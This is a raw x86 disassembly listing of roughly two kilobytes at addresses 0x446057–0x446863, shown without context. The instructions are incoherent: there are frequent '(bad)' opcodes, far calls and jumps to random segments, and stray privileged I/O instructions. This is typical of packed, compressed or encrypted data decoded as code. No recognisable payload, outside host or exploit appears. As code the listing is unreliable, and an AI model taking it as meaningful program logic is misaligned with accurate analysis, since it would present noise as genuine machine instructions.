  446057:	jae    0x4460d5
  446059:	inc    ebx
  44605a:	xchg   ebp,eax
  44605b:	xor    BYTE PTR [ebx-0x4d641ce2],ch
  446061:	xchg   DWORD PTR [ecx+ebp*4+0x35],esi
  446065:	xor    al,0x3c
  446067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446068:	enter  0x2767,0x3c
  44606c:	jmp    0xbdf506ff
  446071:	stos   BYTE PTR es:[edi],al
  446072:	xor    eax,0x5ee5d59e
  446077:	xchg   DWORD PTR [ebx+0x65],edx
  44607a:	sahf   
  44607b:	(bad)  
  44607c:	lds    ecx,FWORD PTR [ebx]
  44607e:	repz aas 
  446080:	test   eax,0x1c75734c
  446085:	loope  0x446024
  446087:	or     eax,0xcc1faab4
  44608c:	push   edx
  44608d:	test   eax,0xefc0129b
  446092:	push   edx
  446093:	xlat   BYTE PTR ds:[ebx]
  446094:	sbb    DWORD PTR [edx],ecx
  446096:	mov    ch,0x73
  446098:	mov    cl,0x4f
  44609a:	cli    
  44609b:	into   
  44609c:	xchg   ecx,eax
  44609d:	fbstp  TBYTE PTR [eax]
  44609f:	stc    
  4460a0:	mov    dl,0x23
  4460a2:	xchg   ebx,eax
  4460a3:	adc    al,BYTE PTR [ebp-0x69]
  4460a6:	es icebp 
  4460a8:	cmp    cl,BYTE PTR [ebx]
  4460aa:	add    al,0x1c
  4460ac:	xchg   ebx,eax
  4460ad:	pop    esp
  4460ae:	fld    TBYTE PTR [edx-0x1567fb5e]
  4460b4:	mov    ds:0xcc6de8e2,eax
  4460b9:	(bad)  
  4460ba:	jp     0x446054
  4460bc:	inc    ebx
  4460bd:	add    BYTE PTR [edx+0x27555901],bl
  4460c3:	hlt    
  4460c4:	stos   BYTE PTR es:[edi],al
  4460c5:	xor    eax,0xe807a736
  4460ca:	dec    esi
  4460cb:	pop    edx
  4460cc:	mov    ebp,0xb2289d1e
  4460d1:	push   cs
  4460d2:	xchg   ebx,eax
  4460d3:	cmp    BYTE PTR [esi],al
  4460d5:	or     bl,BYTE PTR [eax]
  4460d7:	dec    ecx
  4460d8:	sbb    eax,0x53bf710e
  4460dd:	dec    ebp
  4460de:	dec    eax
  4460df:	addr16 clc 
  4460e1:	jns    0x4460b2
  4460e3:	outs   dx,DWORD PTR ds:[esi]
  4460e4:	inc    esi
  4460e5:	neg    DWORD PTR [edx+0x298e78c3]
  4460eb:	sbb    edx,DWORD PTR [edi]
  4460ed:	cmp    al,0x8d
  4460ef:	shl    DWORD PTR ds:0xb0d7f893,1
  4460f5:	or     esp,DWORD PTR [eax+0x254122ce]
  4460fb:	imul   esi,DWORD PTR [ebx],0x7e04fdbe
  446101:	js     0x44609d
  446103:	test   ecx,edx
  446105:	(bad)  
  446106:	cmp    al,0xa7
  446108:	add    bl,BYTE PTR [ebx-0x771688f8]
  44610e:	jne    0x4460e6
  446110:	mov    dl,0x48
  446112:	sub    al,0x20
  446114:	mov    esi,0xcf6b26d8
  446119:	or     edx,DWORD PTR [edi]
  44611b:	int3   
  44611c:	jno    0x44617a
  44611e:	jecxz  0x4460e2
  446120:	mov    ebp,0xb8709a88
  446125:	adc    dh,BYTE PTR [eax-0x48b368b8]
  44612b:	aas    
  44612c:	or     dl,BYTE PTR fs:[edx]
  44612f:	push   eax
  446130:	jmp    0x44619a
  446132:	push   ecx
  446133:	mov    ecx,0xdf93efd5
  446138:	mov    esp,0xa3b15005
  44613d:	or     ebx,DWORD PTR [esi+0x14aa5176]
  446143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446144:	aaa    
  446145:	push   edi
  446146:	push   ds
  446147:	stos   DWORD PTR es:[edi],eax
  446148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446149:	cmp    dh,BYTE PTR ds:0x29d0627
  44614f:	in     al,0xb2
  446151:	call   FWORD PTR [edx-0x1]
  446154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446155:	cmp    ebx,ebx
  446157:	hlt    
  446158:	pop    ss
  446159:	or     BYTE PTR [edi],dl
  44615b:	popa   
  44615c:	es icebp 
  44615e:	cdq    
  44615f:	xchg   BYTE PTR [edx-0x73],dh
  446162:	mov    ds:0x8097b241,al
  446167:	inc    edx
  446168:	cmp    al,0xcf
  44616a:	ret    0x222b
  44616d:	or     ebx,ebx
  44616f:	jle    0x446133
  446171:	daa    
  446172:	and    eax,0x872f4796
  446177:	push   0x101a998e
  44617c:	inc    eax
  44617d:	call   0xa761:0xf95cfa64
  446184:	sub    esp,eax
  446186:	sbb    DWORD PTR [edi-0x12],ebp
  446189:	(bad)  
  44618a:	in     eax,0x33
  44618c:	mov    cl,0xa4
  44618e:	adc    ah,ch
  446190:	sbb    bl,BYTE PTR [edx-0x3645b023]
  446196:	xchg   edi,eax
  446197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446198:	leave  
  446199:	and    eax,0xc8007727
  44619e:	sti    
  44619f:	and    dh,BYTE PTR [edx-0x1dc25db9]
  4461a5:	sbb    ebp,DWORD PTR [esi]
  4461a7:	xor    bh,BYTE PTR [ebp-0x55]
  4461aa:	inc    esp
  4461ab:	mov    DWORD PTR [ebp-0x9575b4d],ebp
  4461b1:	ror    BYTE PTR [ebx-0x15b76dbb],cl
  4461b7:	or     dh,bl
  4461b9:	daa    
  4461ba:	test   BYTE PTR [ebp-0x60e5c394],dl
  4461c0:	cld    
  4461c1:	imul   ebp,DWORD PTR [edx+esi*4+0x52740b33],0xffffffba
  4461c9:	pop    ebx
  4461ca:	xor    ebp,DWORD PTR [esi]
  4461cc:	mov    BYTE PTR [ecx],bl
  4461ce:	call   0xc174:0xb46ed450
  4461d5:	pop    ds
  4461d6:	fwait
  4461d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4461d8:	test   eax,0x969a3833
  4461dd:	leave  
  4461de:	loope  0x446224
  4461e0:	mov    al,0x88
  4461e2:	lods   eax,DWORD PTR ds:[esi]
  4461e3:	ins    DWORD PTR es:[edi],dx
  4461e4:	xor    BYTE PTR [ebp-0x21],0x27
  4461e8:	push   ebp
  4461e9:	idiv   BYTE PTR [edx]
  4461eb:	out    dx,eax
  4461ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4461ed:	or     eax,DWORD PTR [esi]
  4461ef:	add    DWORD PTR [eax-0x1e],eax
  4461f2:	mov    esp,0x9b39bec7
  4461f7:	cmp    DWORD PTR [ecx+0x5e],0xffffffe5
  4461fb:	je     0x4461c6
  4461fd:	mov    DWORD PTR [edx+0x51],esi
  446200:	jae    0x44620c
  446202:	mov    edx,0x28439e6d
  446207:	mov    dh,0xce
  446209:	not    esp
  44620b:	cmp    ah,BYTE PTR [ebp-0x4d7514d4]
  446211:	jns    0x4461dc
  446213:	mov    ecx,?
  446215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446216:	mov    ebx,0xd7baeb5
  44621b:	mov    ebx,0xc530cbd3
  446220:	cmp    DWORD PTR [esi],eax
  446222:	inc    ebx
  446223:	test   BYTE PTR [edx-0x26052ce0],dh
  446229:	nop
  44622a:	push   esi
  44622b:	jecxz  0x4461eb
  44622d:	aaa    
  44622e:	fild   WORD PTR [edx+esi*1]
  446231:	cmp    eax,0x282cb633
  446236:	daa    
  446237:	xchg   ebp,eax
  446238:	xchg   edi,eax
  446239:	jbe    0x446248
  44623b:	test   eax,0x707fcbda
  446240:	jg     0x446220
  446242:	test   BYTE PTR [edi+0x14fa8d22],ah
  446248:	push   esi
  446249:	js     0x4461d3
  44624b:	xor    esi,edi
  44624d:	mov    edi,0x6258a9ae
  446252:	cmp    edi,esp
  446254:	pop    edi
  446255:	ins    BYTE PTR es:[edi],dx
  446256:	pop    ss
  446257:	sub    ebx,0xffffffed
  44625a:	dec    esp
  44625b:	mov    ds:0x7b9f5dc0,al
  446260:	mov    DWORD PTR [ebx],ecx
  446262:	dec    ebx
  446263:	cwde   
  446264:	xchg   DWORD PTR [ecx+0xfaf57c4],ebp
  44626a:	inc    edi
  44626b:	je     0x44628d
  44626d:	push   ebx
  44626e:	call   0x4bd8:0x19aee357
  446275:	or     ebx,DWORD PTR [ebx+0x73c8860d]
  44627b:	ss mov ebx,0x3748bed9
  446281:	fcomp  DWORD PTR [edx-0x307a8023]
  446287:	and    eax,0xc6ed2577
  44628c:	or     edx,DWORD PTR [esi]
  44628e:	mov    ah,0xa9
  446290:	mul    DWORD PTR [ecx]
  446292:	pop    edx
  446293:	mov    bh,0x4c
  446295:	xlat   BYTE PTR ds:[ebx]
  446296:	lock enter 0x68b1,0x1c
  44629b:	or     BYTE PTR [esi+0x7b],cl
  44629e:	in     al,dx
  44629f:	cmovbe ecx,DWORD PTR [ecx-0x290f5850]
  4462a6:	xor    ch,BYTE PTR [eax+0x3ad5c612]
  4462ac:	mov    dl,0xf9
  4462ae:	test   al,0xd8
  4462b0:	push   ebp
  4462b1:	sub    al,0x8c
  4462b3:	adc    ah,BYTE PTR [eax]
  4462b5:	or     esp,DWORD PTR [ecx+eiz*2-0x11]
  4462b9:	gs lods eax,DWORD PTR gs:[esi]
  4462bc:	sbb    eax,0x2741aacf
  4462c1:	cmp    eax,DWORD PTR [edi*4+0x2e090bd3]
  4462c8:	pop    ebx
  4462c9:	xor    eax,0xb6eaec3d
  4462ce:	xchg   ecx,eax
  4462cf:	inc    esp
  4462d0:	div    ecx
  4462d2:	enter  0x9459,0xa
  4462d6:	cmp    esi,DWORD PTR [edi+0x14]
  4462d9:	gs in  al,dx
  4462db:	inc    edi
  4462dc:	mov    ebp,0x7364c4c6
  4462e1:	das    
  4462e2:	cmc    
  4462e3:	push   ebp
  4462e4:	xor    ah,cl
  4462e6:	retf   0xe362
  4462e9:	mov    dh,0x42
  4462eb:	sub    esi,DWORD PTR [edx-0x29d1b414]
  4462f1:	or     DWORD PTR [edi],0xbb0b0d6c
  4462f7:	pop    ds
  4462f8:	fmul   QWORD PTR [ebp-0x78]
  4462fb:	rcr    BYTE PTR [ebx+0x6b2ca49f],cl
  446301:	mov    ebx,esi
  446303:	fwait
  446304:	add    BYTE PTR [edx],0x4b
  446307:	int3   
  446308:	retf   0xae08
  44630b:	arpl   WORD PTR [ecx],cx
  44630d:	sub    ecx,DWORD PTR gs:[ecx+0x4b]
  446311:	mov    ds:0x6db82086,eax
  446316:	shl    BYTE PTR [eax],cl
  446318:	cmp    cl,0xf9
  44631b:	adc    bh,ah
  44631d:	or     eax,DWORD PTR [ebp+0x33f08364]
  446323:	sbb    al,0xa4
  446325:	out    dx,al
  446326:	jp     0x446308
  446328:	lods   al,BYTE PTR ds:[esi]
  446329:	push   es
  44632a:	push   edx
  44632b:	inc    ebp
  44632c:	jb     0x4462ec
  44632e:	inc    ecx
  44632f:	xor    ch,al
  446331:	sub    al,BYTE PTR [edx-0x50f50559]
  446337:	(bad)  
  446339:	xor    esi,edx
  44633b:	push   ebp
  44633c:	pop    esp
  44633d:	dec    esp
  44633e:	call   0xe3f4:0xef2b8ba0
  446345:	inc    ebp
  446346:	jg     0x4462ef
  446348:	sub    BYTE PTR [edx],bh
  44634a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44634b:	outs   dx,DWORD PTR ds:[esi]
  44634c:	pop    esi
  44634d:	jmp    0xf968:0xf75f98ad
  446354:	mov    dl,0x6b
  446356:	sub    eax,0xf346306a
  44635b:	jo     0x446350
  44635d:	or     ebp,DWORD PTR [ebx+ecx*8]
  446360:	pop    ecx
  446361:	add    eax,0xe3311cd8
  446366:	call   0xaf0:0x2af84fe2
  44636d:	sbb    bl,BYTE PTR ss:[esi-0x51722f79]
  446374:	ins    DWORD PTR es:[edi],dx
  446375:	or     edi,DWORD PTR [edi+ecx*4-0x34b686cd]
  44637c:	push   eax
  44637d:	fist   DWORD PTR [ebp-0x2dfbe678]
  446383:	out    0xe1,eax
  446385:	jmp    0x7ee0:0xa8e6eeb
  44638c:	dec    ebx
  44638d:	(bad)  
  44638e:	aad    0xb2
  446390:	call   0x9a03:0x7d878eee
  446397:	rcl    ah,cl
  446399:	xchg   BYTE PTR [edx],ah
  44639b:	sub    BYTE PTR [ebx+0x6ca77b16],dl
  4463a1:	mov    dl,0x93
  4463a3:	fcom   DWORD PTR [eax]
  4463a5:	test   al,0x62
  4463a7:	gs mov esp,0x197d2191
  4463ad:	sub    ebp,DWORD PTR [edx+0x77366745]
  4463b3:	mov    eax,0xe5fe10b8
  4463b8:	xchg   ebp,eax
  4463b9:	mov    BYTE PTR [edi-0x6b],dl
  4463bc:	jb     0x446387
  4463be:	in     al,0x87
  4463c0:	pop    eax
  4463c1:	jmp    0xdbdc345f
  4463c6:	jl     0x4463c3
  4463c8:	push   0xffffffb3
  4463ca:	jmp    0x4463a7
  4463cc:	fisttp WORD PTR [ebx]
  4463ce:	cmp    bl,dl
  4463d0:	sub    DWORD PTR [edx*2-0x65904ef6],0xd81ca6f1
  4463db:	pop    ebp
  4463dc:	xchg   edx,eax
  4463dd:	lea    ecx,[edi]
  4463df:	push   ebp
  4463e0:	jnp    0x4463ec
  4463e2:	and    BYTE PTR [eax+0x2],bh
  4463e5:	leave  
  4463e6:	jb     0x446466
  4463e8:	or     edi,0x6bbe38ad
  4463ee:	cwde   
  4463ef:	cmp    al,0x30
  4463f1:	sbb    al,0x29
  4463f3:	mov    DWORD PTR [edi-0x54585a2f],ecx
  4463f9:	mov    ds:0x772d1cb3,al
  4463fe:	call   0x8bfd:0x5eb9f14d
  446405:	ds dec ecx
  446407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446408:	es idiv eax
  44640b:	loope  0x4463f0
  44640d:	ret    
  44640e:	fisttp DWORD PTR [ebx-0x6b659ea8]
  446414:	xor    bl,BYTE PTR [ebx]
  446416:	xlat   BYTE PTR ds:[ebx]
  446417:	mov    WORD PTR [ebx],?
  446419:	mov    al,ds:0xb3d0a7e2
  44641e:	pop    ecx
  44641f:	ret    
  446420:	add    al,0xb0
  446422:	aas    
  446423:	and    DWORD PTR [edx],0x79
  446426:	loope  0x44646c
  446428:	mov    ch,0x8b
  44642a:	imul   ebx,DWORD PTR [ebp-0x18],0x3a
  44642e:	(bad)  
  44642f:	(bad)  
  446430:	lock (bad) 
  446432:	hlt    
  446433:	call   0x75766f87
  446438:	and    eax,0x41d99ee6
  44643d:	lds    ecx,FWORD PTR [ebp+edi*2-0x6265476d]
  446444:	not    BYTE PTR ds:0xbb57e51
  44644a:	inc    ebp
  44644b:	lods   eax,DWORD PTR ds:[esi]
  44644c:	popa   
  44644d:	and    dh,dh
  44644f:	or     esi,DWORD PTR [ebx+0x72ba9aff]
  446455:	dec    ebx
  446456:	sbb    DWORD PTR [ecx],esi
  446458:	or     esp,DWORD PTR [ecx+edx*4]
  44645b:	mov    ecx,0x68cbaa00
  446460:	and    DWORD PTR [ecx-0x66],ebx
  446463:	add    al,0xfd
  446465:	shl    DWORD PTR [edx-0x1a644a89],0xca
  44646c:	ja     0x446443
  44646e:	cmp    cl,BYTE PTR [edi-0x26]
  446471:	imul   cl
  446473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446474:	dec    esp
  446475:	sbb    BYTE PTR [ecx-0x2d],dl
  446478:	inc    esp
  446479:	push   0x80b560db
  44647e:	mov    ch,0x65
  446480:	dec    ecx
  446481:	mov    ah,0xbb
  446483:	mov    ebp,0x96fae94a
  446488:	dec    esi
  446489:	pop    ss
  44648a:	mov    ebx,0x48cb7bf6
  44648f:	fs test eax,0xb2fcebc5
  446495:	mov    esi,0x36ab79e2
  44649a:	test   eax,0x7c0c9d87
  44649f:	jmp    0x5b5e:0xb063cc0f
  4464a6:	sbb    eax,0x9a96f213
  4464ab:	xchg   esi,eax
  4464ac:	xchg   esp,eax
  4464ad:	outs   dx,BYTE PTR ds:[esi]
  4464ae:	mov    eax,ds:0xeaf41db2
  4464b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4464b4:	sbb    edx,DWORD PTR [ecx]
  4464b6:	or     al,0x59
  4464b8:	aaa    
  4464b9:	ds repnz es scas eax,DWORD PTR es:[edi]
  4464bd:	gs mov dl,0x13
  4464c0:	mov    dl,0x89
  4464c2:	test   DWORD PTR [edx-0x44a464bc],esi
  4464c8:	stc    
  4464c9:	mov    eax,0x2442e70e
  4464ce:	arpl   WORD PTR [eax+0x36],ax
  4464d1:	ficomp DWORD PTR [ebx-0x540785d]
  4464d7:	xor    ch,BYTE PTR [edx-0x141b154a]
  4464dd:	push   ss
  4464de:	in     eax,0x96
  4464e0:	xor    ecx,DWORD PTR [ebx]
  4464e2:	xchg   ebx,eax
  4464e3:	lahf   
  4464e4:	scas   al,BYTE PTR es:[edi]
  4464e5:	(bad)  
  4464e6:	loop   0x446555
  4464e8:	mov    dl,0x56
  4464ea:	mov    eax,ds:0xb7da0dd4
  4464ef:	inc    esi
  4464f0:	inc    esp
  4464f1:	or     esi,DWORD PTR [edi]
  4464f3:	inc    edx
  4464f4:	cmp    DWORD PTR [edi+0xa],0x1f
  4464f8:	adc    eax,0xbdcde4d2
  4464fd:	sahf   
  4464fe:	(bad)  
  4464ff:	call   0x66df1993
  446504:	pusha  
  446505:	or     eax,0x3259c108
  44650a:	jecxz  0x4464af
  44650c:	xor    al,BYTE PTR [ecx]
  44650e:	push   0x7bbe8448
  446513:	adc    eax,0x799d7db2
  446518:	fs inc ecx
  44651a:	cmp    al,0x4b
  44651c:	cwde   
  44651d:	or     edx,DWORD PTR [esi]
  44651f:	sub    BYTE PTR [esi-0x4a],bh
  446522:	push   ecx
  446523:	lods   al,BYTE PTR ds:[esi]
  446524:	(bad)  
  446525:	jecxz  0x4464c1
  446527:	cdq    
  446528:	test   bh,dl
  44652a:	dec    edx
  44652b:	inc    esp
  44652c:	int3   
  44652d:	push   es
  44652e:	add    eax,0x7b0ba355
  446533:	or     DWORD PTR [esi-0x4104d994],edx
  446539:	daa    
  44653a:	xchg   DWORD PTR [edi],ebx
  44653c:	je     0x446531
  44653e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  446540:	fdivr  DWORD PTR [edi+0x4ba5dc4f]
  446546:	mul    DWORD PTR [edi+0x11b9827b]
  44654c:	sub    eax,0xb259a41f
  446551:	sbb    dl,BYTE PTR [ecx-0x1bd416b5]
  446557:	sbb    DWORD PTR [esi],0xb
  44655a:	dec    ebp
  44655b:	jmp    0xd4ec3bd4
  446560:	(bad)  
  446561:	push   ecx
  446562:	call   0x2a1d:0x55232760
  446569:	or     DWORD PTR [esi+0x76ca1fa9],0xffffff8a
  446570:	jb     0x4465c0
  446572:	jns    0x4465ae
  446574:	xchg   esp,eax
  446575:	repz data16 jns 0x44651d
  446579:	je     0x446578
  44657b:	xor    al,0xa6
  44657d:	rol    edx,cl
  44657f:	test   eax,0x398d2819
  446584:	mov    ebp,0x5dc73bf8
  446589:	jl     0x44654c
  44658b:	and    BYTE PTR [edx+0x31],cl
  44658e:	dec    ecx
  44658f:	sub    ecx,DWORD PTR [eax+0x1d]
  446592:	jl     0x4465a4
  446594:	stos   BYTE PTR es:[edi],al
  446595:	or     eax,DWORD PTR ds:0xe3aea531
  44659b:	(bad)  
  44659c:	mov    dl,0x6
  44659e:	lods   al,BYTE PTR ds:[esi]
  44659f:	xor    eax,0x27802a4a
  4465a4:	or     DWORD PTR [edx],0xffffffb0
  4465a7:	sbb    al,cl
  4465a9:	sub    DWORD PTR [ecx+0x2b],esp
  4465ac:	mov    ah,0xdb
  4465ae:	fimul  WORD PTR [edi-0x4e]
  4465b1:	daa    
  4465b2:	popf   
  4465b3:	jmp    0x93db21be
  4465b8:	scas   al,BYTE PTR es:[edi]
  4465b9:	xor    bh,BYTE PTR [eax]
  4465bb:	inc    ebp
  4465bc:	pushf  
  4465bd:	(bad)  [edi+0x3bc3dca7]
  4465c3:	outs   dx,BYTE PTR ds:[esi]
  4465c4:	rcr    BYTE PTR [eax+0x631e369a],0x88
  4465cb:	and    edx,0x46
  4465ce:	das    
  4465cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4465d0:	pop    ss
  4465d1:	xchg   ecx,eax
  4465d2:	mov    DWORD PTR [ecx+0x7004ca4a],esi
  4465d8:	mov    ch,0xd9
  4465da:	push   esi
  4465db:	jle    0x4465ae
  4465dd:	lods   al,BYTE PTR ds:[esi]
  4465de:	cli    
  4465df:	test   eax,0x8abb8a94
  4465e4:	idiv   BYTE PTR [esi+eiz*2]
  4465e7:	stos   DWORD PTR es:[edi],eax
  4465e8:	mov    ebp,0x5a8767cc
  4465ed:	ins    BYTE PTR es:[edi],dx
  4465ee:	cwde   
  4465ef:	xor    DWORD PTR [eax+0x22d11f0b],edx
  4465f5:	repz cld 
  4465f7:	retf   
  4465f8:	fild   DWORD PTR [edx+ebx*4+0x3e305264]
  4465ff:	inc    ebx
  446600:	inc    ebx
  446601:	jno    0x4465fa
  446603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446604:	cdq    
  446605:	cmp    al,0x37
  446607:	adc    eax,0x1b22c30
  44660c:	pop    edx
  44660d:	js     0x4465b1
  44660f:	and    BYTE PTR [ecx-0x75],dl
  446612:	sbb    al,dl
  446614:	mov    ds:0x6f6f4b24,al
  446619:	or     ebx,ebp
  44661b:	cmp    eax,0x7402f12d
  446620:	sub    eax,eax
  446622:	call   0x6284:0x39a70586
  446629:	int3   
  44662a:	dec    eax
  44662b:	mov    al,ds:0x82124c40
  446630:	inc    ebx
  446631:	dec    esp
  446632:	test   DWORD PTR [esi+0x16],edx
  446635:	pop    esi
  446636:	xchg   DWORD PTR [ebx+0x1a],edi
  446639:	arpl   WORD PTR [ecx-0x7f49098],sp
  44663f:	jl     0x446601
  446641:	push   0xbf0195d
  446646:	pop    ecx
  446647:	mov    bl,0x35
  446649:	xchg   ebx,eax
  44664a:	or     dl,bl
  44664c:	call   0xc48b228e
  446651:	cmp    DWORD PTR [edx+0x63d736e6],ebx
  446657:	inc    ecx
  446658:	jle    0x446665
  44665a:	sbb    BYTE PTR [esi+eiz*1-0x65],0x97
  44665f:	push   ecx
  446660:	imul   edx,DWORD PTR [ecx-0x509c5b63],0x5ce5f3b3
  44666a:	sub    dh,ah
  44666c:	pop    eax
  44666d:	cs push ebx
  44666f:	mov    ds:0x5aad841c,eax
  446674:	test   DWORD PTR [esi+0x168a721],0x9aeb3d1d
  44667e:	fwait
  44667f:	jge    0x446683
  446681:	test   DWORD PTR [edi+0x57168149],ecx
  446687:	mov    bl,0x5e
  446689:	ret    
  44668a:	cld    
  44668b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44668c:	ins    DWORD PTR es:[edi],dx
  44668d:	inc    edi
  44668e:	(bad)  
  44668f:	and    DWORD PTR [ecx],ecx
  446691:	ror    DWORD PTR [si-0x4e],cl
  446695:	in     al,0xd7
  446697:	add    al,bl
  446699:	icebp  
  44669a:	pop    edi
  44669b:	popf   
  44669c:	test   DWORD PTR [eax],ecx
  44669e:	adc    ah,BYTE PTR [eax-0x23]
  4466a1:	mov    ds:0x8d1ae2f8,eax
  4466a6:	stos   BYTE PTR es:[edi],al
  4466a7:	sub    BYTE PTR [edi-0x64ddd7be],dh
  4466ad:	adc    eax,0x37b4565a
  4466b2:	push   es
  4466b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4466b4:	push   ss
  4466b5:	ror    DWORD PTR [edi+edi*2-0x4b],0x91
  4466ba:	hlt    
  4466bb:	aam    0x46
  4466bd:	and    bl,BYTE PTR [edx-0x36863157]
  4466c3:	mov    esi,0xa07b2a76
  4466c8:	xor    BYTE PTR [edi+0x5b81e92f],0x4a
  4466cf:	pop    esp
  4466d0:	adc    BYTE PTR [ebp-0x2a],0x9f
  4466d4:	clc    
  4466d5:	xor    eax,0xe8f2a744
  4466da:	or     BYTE PTR [edi+0x53],ch
  4466dd:	xor    DWORD PTR [ecx],edi
  4466df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4466e0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4466e2:	(bad)  
  4466e3:	ficomp WORD PTR [ecx]
  4466e5:	mov    es,WORD PTR [edx]
  4466e7:	stc    
  4466e8:	loopne 0x4466ba
  4466ea:	call   0x5ee1:0x6743c879
  4466f1:	stos   DWORD PTR es:[edi],eax
  4466f2:	pop    ebx
  4466f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4466f4:	jg     0x4466e4
  4466f6:	cmp    edx,DWORD PTR ds:[ebx+0x10]
  4466fa:	(bad)  
  4466fb:	ja     0x4466b5
  4466fd:	cmp    ebx,DWORD PTR [edi-0x5f1d0191]
  446703:	clc    
  446704:	jb     0x446696
  446706:	lods   al,BYTE PTR ds:[esi]
  446707:	icebp  
  446708:	cmp    DWORD PTR [esi+ebp*8],esi
  44670b:	cmp    bh,BYTE PTR [eax+0x8cb262f]
  446711:	or     al,0xb3
  446713:	cmp    eax,0x4fc05bd7
  446718:	sub    edi,DWORD PTR [ebp+0x2868c685]
  44671e:	call   0x4d73:0xca9eba14
  446725:	or     bh,BYTE PTR [edx-0x5c9b7e19]
  44672b:	or     edi,DWORD PTR [edi-0x4dc94115]
  446731:	cs iret 
  446733:	scas   eax,DWORD PTR es:[edi]
  446734:	mov    WORD PTR [edi+0xb39bbc6],es
  44673a:	js     0x4466ee
  44673c:	mov    ebp,0x1db36c3f
  446741:	arpl   WORD PTR [esi-0x64e8346f],di
  446747:	test   DWORD PTR [edx+ebp*4],esi
  44674a:	mov    ch,0x57
  44674c:	shl    BYTE PTR [eax],cl
  44674e:	push   esi
  44674f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446750:	lods   al,BYTE PTR ds:[esi]
  446751:	xor    ebx,DWORD PTR [ebx]
  446753:	cwde   
  446754:	popa   
  446755:	retf   
  446756:	jg     0x44677a
  446758:	pop    esp
  446759:	xchg   ecx,eax
  44675a:	call   0x4078:0xf1bdb8fc
  446761:	ficom  DWORD PTR [ecx-0x59]
  446764:	jo     0x446743
  446766:	cmp    ch,cl
  446768:	pop    ebx
  446769:	sbb    eax,0xecb20bdc
  44676e:	and    dl,BYTE PTR [edx+0x51]
  446771:	in     al,0xdd
  446773:	xchg   DWORD PTR [esi+0xb],ebp
  446776:	inc    eax
  446777:	cmp    al,0x39
  446779:	mov    ebx,DWORD PTR [ebx-0x15]
  44677c:	(bad)  
  44677d:	xor    eax,DWORD PTR [edi-0x6695530f]
  446783:	mov    ebp,0x1ff6648c
  446788:	fcom   QWORD PTR [ecx+0x5ac3a70b]
  44678e:	xchg   edx,eax
  44678f:	iret   
  446790:	xor    al,al
  446792:	dec    ebp
  446793:	cmc    
  446794:	mov    cl,0xb2
  446796:	add    eax,0xb4985b82
  44679b:	daa    
  44679c:	jb     0x446730
  44679e:	jg     0x446747
  4467a0:	je     0x446770
  4467a2:	mov    bh,0x54
  4467a4:	popf   
  4467a5:	dec    ecx
  4467a6:	cwde   
  4467a7:	fdiv   QWORD PTR [ebx+0x5dc85e33]
  4467ad:	and    edx,esi
  4467af:	mov    ebp,0xa7244a92
  4467b4:	add    al,0xa
  4467b6:	cmp    eax,DWORD PTR [ebp-0x659ac313]
  4467bc:	mov    ecx,0x62ff7639
  4467c1:	mov    edi,DWORD PTR [edi-0x32]
  4467c4:	sbb    BYTE PTR [ebx],0x58
  4467c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4467c8:	lods   eax,DWORD PTR ds:[esi]
  4467c9:	fidivr DWORD PTR [ebx-0x2d64ab6f]
  4467cf:	pusha  
  4467d0:	mov    dl,0x93
  4467d2:	adc    eax,0x1e94569f
  4467d7:	stc    
  4467d8:	mov    dh,0xb
  4467da:	test   al,0x87
  4467dc:	sti    
  4467dd:	add    ecx,DWORD PTR [ecx-0x5f]
  4467e0:	cmp    cl,BYTE PTR [ebp-0x50c4e566]
  4467e6:	xchg   DWORD PTR [edi-0x13],esi
  4467e9:	mov    esp,0x77f89c62
  4467ee:	call   0xb575:0x30fcd539
  4467f5:	add    ebx,DWORD PTR [edx-0x13693a2]
  4467fb:	sbb    BYTE PTR [eax+0x24],ch
  4467fe:	mov    ah,0xa7
  446800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446801:	add    ah,BYTE PTR [edx-0x16]
  446804:	scas   al,BYTE PTR es:[edi]
  446805:	(bad)  
  446806:	fstp   DWORD PTR [edx-0x4f]
  446809:	rcl    DWORD PTR [ecx+edi*2+0x67d1f815],0xec
  446811:	jmp    0xbf00:0xb6c1fda
  446818:	mov    al,0x8f
  44681a:	aad    0x55
  44681c:	stos   DWORD PTR es:[edi],eax
  44681d:	fstp   QWORD PTR [edx-0x4ff9a9d8]
  446823:	jecxz  0x4467ae
  446825:	xchg   esp,eax
  446826:	xchg   ebp,eax
  446827:	test   eax,0x6b0ac1c3
  44682c:	xchg   edx,eax
  44682d:	in     al,dx
  44682e:	mov    bh,0x49
  446830:	sbb    al,0xcd
  446832:	call   0xb324:0x9c824597
  446839:	(bad)  
  44683b:	mov    cl,0x37
  44683d:	xlat   BYTE PTR ds:[ebx]
  44683e:	mov    cl,0x1b
  446840:	xchg   edi,eax
  446841:	or     ebp,DWORD PTR [edi+0x6a6c6b81]
  446847:	dec    cx
  446849:	jp     0x446876
  44684b:	call   0xa284:0xa59a6bad
  446852:	inc    ebp
  446853:	pushf  
  446854:	popa   
  446855:	dec    esi
  446856:	call   0x338a:0x4e3c71cf
  44685d:	outs   dx,DWORD PTR ds:[esi]
  44685e:	fld    DWORD PTR [ebx+0x47]
  446861:	or     DWORD PTR [ecx],ecx
  446863:	sub    eax,0x9e83ab80
